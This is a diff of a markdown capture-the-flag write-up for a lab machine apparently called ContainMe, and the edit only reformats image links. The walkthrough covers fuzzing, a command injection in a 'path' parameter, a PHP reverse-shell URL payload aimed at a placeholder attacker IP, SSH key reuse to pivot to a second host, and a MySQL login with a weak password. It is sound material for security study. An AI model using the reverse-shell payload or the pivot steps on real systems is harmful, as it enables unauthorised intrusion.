@@ -39,38 +39,38 @@ OS fingerprint not ideal because: Missing a closed TCP port so results incomplet
 Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 - 5.15 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
 No exact OS matches for host (test conditions non-ideal).
 ```
-There are four open ports. Visiting each of them shows nothing.
-But after fuzzing I get `index.php`, `info.php` and `index.html` on port `80`.
-![[containME1.png]]
-Visiting `index.php` I found directory listing and interesting `path` URL variable on source code.
-![[containME2.png]]
-![[containME3.png]]
-And there exist path traversal command-injection vulnerability.
-![[containME4.png]]
-So using this I obtained a reverse shell on the machine.
+There are four open ports. Visiting each of them shows nothing.<br/>
+But after fuzzing I get `index.php`, `info.php` and `index.html` on port `80`.<br/>
+![](Assets/containME1.png)<br/>
+Visiting `index.php` I found directory listing and interesting `path` URL variable on source code.<br/>
+![](Assets/containME2.png)<br/>
+![](Assets/containME3.png)<br/>
+And there exist path traversal command-injection vulnerability.<br/>
+![](Assets/containME4.png)<br/>
+So using this I obtained a reverse shell on the machine.<br/>
 `http://<machine_IP>/index.php?path=/home;%20php%20-r%20%27$s=fsockopen(%22<attacker_IP>%22,4444);proc_open(%22sh%22,[$s,$s,$s],$p);%27`
-![[containME5.png]]
-There I found a local user mike and an executable file.
-![[containME6.png]]
-While enumerating more I found:
-![[conatinME7.png]]
-I observed that the file is owned by root and have execute permission.
-![[containME8.png]]
-After executing some commands I found some thing interesting.
-![[containME9.png]]
-Now I can view the `id_rsa` file of mike. But it doesn't allow me to log in that machine via ssh.
-![[containME10.png]]
-So I checked the IPs. Because the hostname was host1. So there might be other hosts.
-![[containME11.png]]
-Downloading the nmap binary I scanned for other host on `172.16.20.0/24`. And discovered another host `172.16.20.6`.
-![[containME12.png]]
-Now using the `id_rsa` from `host1` I logged in as mike in `172.16.20.6`.
-![[containME13.png]]
-There looking at the `/etc/passwd` I found a MySQL server is running.
-![[containME14.png]]
-I logged in the server with password `password`.
-![[containME15.png]]
-Enumerating the server I have obtained the root password.
-![[containME16.png]]
-Using that root password I switched user to root and unzip the zip file with the same password and obtained the flag.
-![[containME17.png]]
+![](Assets/containME5.png)<br/>
+There I found a local user mike and an executable file.<br/>
+![](Assets/containME6.png)<br/>
+While enumerating more I found:<br/>
+![](Assets/containME7.png)<br/>
+I observed that the file is owned by root and have execute permission.<br/>
+![](Assets/containME8.png)<br/>
+After executing some commands I found some thing interesting.<br/>
+![](Assets/containME9.png)<br/>
+Now I can view the `id_rsa` file of mike. But it doesn't allow me to log in that machine via ssh.<br/>
+![](Assets/containME10.png)<br/>
+So I checked the IPs. Because the hostname was host1. So there might be other hosts.<br/>
+![](Assets/containME11.png)<br/>
+Downloading the nmap binary I scanned for other host on `172.16.20.0/24`. And discovered another host `172.16.20.6`.<br/>
+![](Assets/containME12.png)<br/>
+Now using the `id_rsa` from `host1` I logged in as mike in `172.16.20.6`.<br/>
+![](Assets/containME13.png)<br/>
+There looking at the `/etc/passwd` I found a MySQL server is running.<br/>
+![](Assets/containME14.png)<br/>
+I logged in the server with password `password`.<br/>
+![](Assets/containME15.png)<br/>
+Enumerating the server I have obtained the root password.<br/>
+![](Assets/containME16.png)<br/>
+Using that root password I switched user to root and unzip the zip file with the same password and obtained the flag.<br/>
+![](Assets/containME17.png)<br/>
